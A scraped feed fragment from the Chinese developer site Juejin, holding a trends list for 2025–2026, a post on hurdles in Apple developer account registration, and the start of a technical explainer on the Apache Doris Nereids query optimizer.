.hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>大家好，我是天天要思考的的码哥。今天让我们来回顾下2025的十大热点，顺便也预测下2026年的热点。</p>
<h3 data-id="heading-0">2025年十大热点</h3>
<ol>
<li>
<p>全国统一大市场：打破地方卖货壁垒，跨省做生意再也不用被卡脖子，靠新路子赚钱的人越来越多</p>
</li>
<li>
<p>消费回暖：发补贴、搞活动刺激花钱，大家敢买奶茶、潮玩、宠物用品了，钱都花在自己开心上</p>
</li>
<li>
<p>服务消费爆火：按摩、旅游、看展比买衣服花得多，年轻人愿意为体验感掏钱</p>
</li>
<li>
<p>县城生意好做：大牌下县城开分店，村里人也能网购到和城里一样的好东西</p>
</li>
<li>
<p>吃饭更在乎性价比：告别天价网红店，大家转身选实惠又健康的家常菜馆</p>
</li>
<li>
<p>DeepSeek大模型出圈：国产AI能写方案、改作业，普通人用上免费好用的智能工具</p>
</li>
<li>
<p>直播带货踩雷多：假品牌、夸大宣传被严查，主播不敢再随便忽悠人了</p>
</li>
<li>
<p>情绪消费顶流：买盲盒、给宠物买零食花了两万多亿，靠花钱治愈日常不开心</p>
</li>
<li>
<p>人形机器人快要量产：机器人不再是展台样品，等着进厂拧螺丝干体力活</p>
</li>
<li>
<p>苏超带火全民看球：足球比赛成了城市新名片，现场观众比中超还热闹</p>
</li>
</ol>
<h3 data-id="heading-1">2026年热点预测：</h3>
<ol>
<li>
<p>国产芯片不再被卡</p>
</li>
<li>
<p>AI真的好用了，产品落地百花齐放</p>
</li>
<li>
<p>电动车续航要翻倍</p>
</li>
<li>
<p>低空旅游来了</p>
</li>
<li>
<p>科技股暴涨</p>
</li>
</ol>
<p>我是”<strong>程序员码歌</strong>“，<strong>全网昵称统一</strong>，10+年大厂程序员，专注AI工具落地与AI编程实战输出，在职场，玩转副业，目标副业年收入百万，探索可复利、可复制的一人企业成长模式，<strong>可去gzh围观</strong></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[苹果开发者账号申请的痛点，包含新限制说明！]]></title>    <link>https://juejin.cn/post/7592062873829294130</link>    <guid>https://juejin.cn/post/7592062873829294130</guid>    <pubDate>2026-01-06T10:00:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592062873829294130" data-draft-id="7592119218028773410" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="苹果开发者账号申请的痛点，包含新限制说明！"/> <meta itemprop="keywords" content="APP,Apple,uni-app"/> <meta itemprop="datePublished" content="2026-01-06T10:00:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="iOS研究院"/> <meta itemprop="url" content="https://juejin.cn/user/1421041942671774"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            苹果开发者账号申请的痛点，包含新限制说明！
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1421041942671774/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    iOS研究院
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T10:00:13.000Z" title="Tue Jan 06 2026 10:00:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">背景</h2>
<p>上车AppStore必经之路，苹果开发者账号注册。简单盘点一下，申请苹果开发者痛点问题。</p>
<h3 data-id="heading-1">账号注册</h3>
<p>正常的个人开发账号，基本上直接使用 <code>126、163或者QQ邮箱都</code>可以直接使用。</p>
<p>对于公司开发者账号来说，最近新增了限制条件：<strong>申请的邮箱必须为公司邮箱！</strong></p>
<p>这一点限制是在最近申请公司开发账号遇到的问题，对于个人账号账号目前没有影响。<code>[这里感谢粉丝贡献的情报。]</code></p>
<h3 data-id="heading-2">设备问题</h3>
<p>设备问题主要是在Apple ID登录踩的坑。<code>首当其冲的就是设备登录限制。</code></p>
<p>无解直接换新设备，不用想了。<code>不然果子怎么卖的动新手机？ </code></p>
<p>注册开发者的 Developer App，也需要更新到新版本。【有最低版本限制】<code>不然果子怎么卖的动新手机？</code></p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4085172702c452d8d687321f5ed8341~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaU9T56CU56m26Zmi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298412&amp;x-signature=g3a%2B31JIwVDUGHcrnjpE0hTejAs%3D" alt="9135238bf439b2f3a9611a0cfb5e7c8f.jpg" loading="lazy"/></p>
<p>在注册开发者账号的过程中，切记不要更换设备，避免遇到各种奇奇怪怪的问题。也能最大程度的保保证，在注册流程不会被账号关联，避免提交代码就夭折。</p>
<h3 data-id="heading-3">信息验证问题</h3>
<h4 data-id="heading-4">1.账号主体</h4>
<p>对于公司层面的账号，场景最多的问题就是：</p>
<p>Q: 法人用个人账号注册了开发者，那么还可以用公司身份去注册么？</p>
<p>A: 其实是可以的，这一点已经咨询过了苹果客服。因为对于主体而言，一个是邓白氏编码对应的账号，一个是个人身份证对应的账号。所以本质上也是2个独立的主体。</p>
<h4 data-id="heading-5">2.忘记老账户</h4>
<p>对于小部分一些人来说，可能之前注册了开发者流程，也提交的了相应信息。在最后付费环境，考虑到暂时没有产品提交又或者不知道了注册了干嘛，就把账号搁置了。</p>
<p>那这种情况是最头疼的，对于苹果而言信息已经被占用。如果无法使用首次注册开发者的账号，重新进行开发者验证。那么将陷入无法注册的死循环。简而言之：打苹果客服，也只能告诉你用老账户。如果忘记密码或者AppleID【也就是注册的邮箱】，那么对不起奶不回来。<strong>苹果客服没有权限获悉之前注册的任何信息。【上海端口没有这么高的权限！】</strong></p>
<h3 data-id="heading-6">激活开发身份</h3>
<p>如果顺顺利利的完成了，所有前置流程，并且成功支付苹果开发者的会员费￥688.00。那么恭喜你完成了90%</p>
<p>但是，别高兴的太早。<code>很多支付了费用，超过30个小时依旧没有成功获取开发者资格。</code></p>
<p>这种情况，必须要主动与苹果技术支持联系。<code>对于个人账号大概率是需要补充身份证信息，也就是身份证正反面</code>。</p>
<p>苹果会通过开发者邮箱，提供一个附件资料上传地址。上传成功之后，预计2~3个小时将会激活。</p>
<p>之所以遇到这种问题，是因为中国大陆区有些小区名称或者街道过于离谱。比如：</p>
<ul>
<li>
<p><strong>江苏南京神马路</strong>：位于南京市栖霞区，连接马群街道与仙林地区，因谐音与网络流行语 “神马都是浮云” 契合，成为网红路名。</p>
</li>
<li>
<p><strong>江苏南京马桶巷</strong>：位于南京秦淮区，传说因明代此处有制作马桶的手工作坊而得名，现已更名为 “饮马巷”，但老南京人仍习惯称其旧名。</p>
</li>
<li>
<p><strong>江苏苏州裤裆巷</strong>：巷子分岔呈 “Y” 形，形似裤裆，故得此名，后改名 “邾长巷”，但老苏州人仍爱调侃 “穿裤衩的路”。</p>
</li>
<li>
<p><strong>四川成都肥猪市街</strong>：该地以前是卖猪的市场，所以取了这样的名字。同理还有草市街、羊市街等。</p>
</li>
<li>
<p><strong>广东揭阳普宁二奶街</strong>：因上世纪 90 年代街道售卖的衣物价格昂贵，人们调侃称只有 “二奶” 才消费得起，故而得名，如今已发展成为当地有名的人气美食夜市。</p>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/667308bb67034385a63e386c65ec4230~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgaU9T56CU56m26Zmi:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768298412&amp;x-signature=iDgyvQFBbBXYN4j5O0CUVFX3Apw%3D" alt="f3aa64439608fb9ef785ee0acce490ea.png" loading="lazy"/></p>
<p><code>遵守规则，方得长治久安</code>，最后祝大家大吉大利，今晚过审！</p>
<h3 data-id="heading-7">相关推荐</h3>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FURmC_4vxQv5ttOg8yYe7Eg" target="_blank" title="https://mp.weixin.qq.com/s/URmC_4vxQv5ttOg8yYe7Eg" ref="nofollow noopener noreferrer"># 苹果开发者续费大坑及成功续费方案！亲测有效</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2F1bAA90Tzpx03tTHZbdg3aw" target="_blank" title="https://mp.weixin.qq.com/s/1bAA90Tzpx03tTHZbdg3aw" ref="nofollow noopener noreferrer"># AppStore敏感词排查手册，多维度分析Guideline 2.3.1隐藏功能，轻松过审。</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FV2F4BaEYh5HfeUUHm1tI6Q" target="_blank" title="https://mp.weixin.qq.com/s/V2F4BaEYh5HfeUUHm1tI6Q" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（代码篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%2FLs3su8fmMckTocPwMmFaNQ" target="_blank" title="https://mp.weixin.qq.com/s/Ls3su8fmMckTocPwMmFaNQ" ref="nofollow noopener noreferrer"># 如何主动提防苹果3.2f的进攻，自查防御手册（ASO篇）</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484371%26idx%3D1%26sn%3D33568c58e90a5bf4d2612d803ecb2a27%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484371&amp;idx=1&amp;sn=33568c58e90a5bf4d2612d803ecb2a27&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果加急审核是“绿色通道”还是“死亡陷阱”？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484362%26idx%3D1%26sn%3Dea61bd42d5ae8b99d2a56cbfb8d91e88%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484362&amp;idx=1&amp;sn=ea61bd42d5ae8b99d2a56cbfb8d91e88&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 苹果开发者邮箱，突然收到11.2通知严重么？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484413%26idx%3D1%26sn%3D82870d4c8892fa65803a8e05fd5ac938%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484413&amp;idx=1&amp;sn=82870d4c8892fa65803a8e05fd5ac938&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 不想被苹果卡审最好错开这两个提审时间</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484349%26idx%3D1%26sn%3D1c75a6b08cb5de64ddf41a88b61ff108%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484349&amp;idx=1&amp;sn=1c75a6b08cb5de64ddf41a88b61ff108&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 手撕苹果审核4.3是代码问题还是设计问题？</a></p>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzUxMTkxNzAzMw%3D%3D%26mid%3D2247484344%26idx%3D1%26sn%3D4399eb8d8bf82e9c5df26a18b8564cfb%26scene%3D21%23wechat_redirect" target="_blank" title="https://mp.weixin.qq.com/s?__biz=MzUxMTkxNzAzMw==&amp;mid=2247484344&amp;idx=1&amp;sn=4399eb8d8bf82e9c5df26a18b8564cfb&amp;scene=21#wechat_redirect" ref="nofollow noopener noreferrer"># 有幸和Appstore审核人员进行了一场视频会议特此记录。</a></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入doris查询计划以及io调度（二）Nereids优化器详解]]></title>    <link>https://juejin.cn/post/7592119218025758755</link>    <guid>https://juejin.cn/post/7592119218025758755</guid>    <pubDate>2026-01-06T08:02:42.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592119218025758755" data-draft-id="7591942733365674018" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入doris查询计划以及io调度（二）Nereids优化器详解"/> <meta itemprop="keywords" content="数据库"/> <meta itemprop="datePublished" content="2026-01-06T08:02:42.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="语落心生"/> <meta itemprop="url" content="https://juejin.cn/user/2875978147955741"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入doris查询计划以及io调度（二）Nereids优化器详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2875978147955741/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    语落心生
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-06T08:02:42.000Z" title="Tue Jan 06 2026 08:02:42 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-06
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    13
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h3 data-id="heading-0">导读</h3>
<ol>
<li><strong>What</strong>：Nereids优化器的核心组件有哪些？Cascades框架是什么？</li>
<li><strong>Why</strong>：为什么需要重写优化器？Nereids相比传统Planner有哪些优势？</li>
<li><strong>How</strong>：Memo数据结构如何紧凑存储等价表达式？</li>
<li><strong>How</strong>：优化规则如何分类和执行？代价模型如何计算？</li>
</ol>
<h3 data-id="heading-1">核心概念</h3>
<ul>
<li><strong>Cascades框架</strong>：经典的查询优化框架</li>
<li><strong>Memo数据结构</strong>：Group和GroupExpression的紧凑表示</li>
<li><strong>优化规则系统</strong>：Rewrite、Exploration、Implementation三类规则</li>
<li><strong>代价模型（Cost Model）</strong>：CPU、内存、网络代价计算</li>
<li><strong>统计信息（Statistics）</strong>：基数估算、选择率计算</li>
<li><strong>规则优化阶段</strong>：Analyze、Rewrite、Optimize、PostProcess</li>
<li><strong>DPHyp算法</strong>：动态规划Join顺序优化</li>
<li><strong>物化视图改写</strong>：自动利用物化视图加速查询</li>
</ul>
<hr/>
<h2 data-id="heading-2">1. Nereids 优化器架构概览（What &amp; Why）</h2>
<h3 data-id="heading-3">1.1 为什么需要 Nereids 优化器（Why）</h3>
<h4 data-id="heading-4">传统 Planner 的局限性</h4>
<p><strong>传统 Planner 的问题</strong>：</p>
<ol>
<li>
<p><strong>基于规则的优化（RBO）为主</strong>：</p>
<ul>
<li>缺乏完善的代价模型</li>
<li>无法根据数据统计信息做出最优选择</li>
<li>Join 顺序优化能力有限</li>
</ul>
</li>
<li>
<p><strong>硬编码优化逻辑</strong>：</p>
<ul>
<li>新增优化规则需要修改多处代码</li>
<li>难以维护和扩展</li>
<li>规则之间可能存在冲突</li>
</ul>
</li>
<li>
<p><strong>搜索空间受限</strong>：</p>
<ul>
<li>无法探索所有可能的等价计划</li>
<li>容易陷入局部最优</li>
</ul>
</li>
<li>
<p><strong>子查询处理能力弱</strong>：</p>
<ul>
<li>子查询 Unnesting 不完整</li>
<li>相关子查询优化困难</li>
</ul>
</li>
</ol>
<h4 data-id="heading-5">Nereids 的设计目标</h4>
<p><strong>核心目标</strong>：</p>
<ol>
<li>
<p><strong>完整的 CBO 优化器</strong>：</p>
<ul>
<li>基于 Cascades 框架</li>
<li>完善的代价模型和统计信息</li>
<li>自动选择最优执行计划</li>
</ul>
</li>
<li>
<p><strong>声明式规则系统</strong>：</p>
<ul>
<li>模式匹配（Pattern Matching）</li>
<li>规则独立，易于扩展</li>
<li>规则正确性容易验证</li>
</ul>
</li>
<li>
<p><strong>强大的表达式优化</strong>：</p>
<ul>
<li>完整的常量折叠</li>
<li>谓词推导和简化</li>
<li>公共子表达式消除</li>
</ul>
</li>
<li>
<p><strong>先进的 Join 优化</strong>：</p>
<ul>
<li>DPHyp 动态规划算法</li>
<li>支持 Bushy Tree</li>
<li>智能 Join 顺序选择</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6">1.2 Cascades 框架基础</h3>
<p><strong>Cascades 核心思想</strong>：</p>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[初始查询计划] --&gt; B[Memo初始化]
    B --&gt; C[应用转换规则]
    C --&gt; D[扩展搜索空间]
    D --&gt; E[探索等价计划]
    E --&gt; F[代价估算]
    F --&gt; G[选择最优计划]
    
    C -.递归.-&gt; C
    E -.递归.-&gt; E
</code></pre>
<p><strong>三个关键概念</strong>：</p>
<ol>
<li>
<p><strong>Memo</strong>：</p>
<ul>
<li>紧凑存储所有等价表达式</li>
<li>避免重复生成相同的计划</li>
<li>Group 表示逻辑等价的表达式集合</li>
</ul>
</li>
<li>
<p><strong>规则驱动（Rule-Based）</strong>：</p>
<ul>
<li>通过应用规则生成新的等价计划</li>
<li>规则分为逻辑转换和物理实现</li>
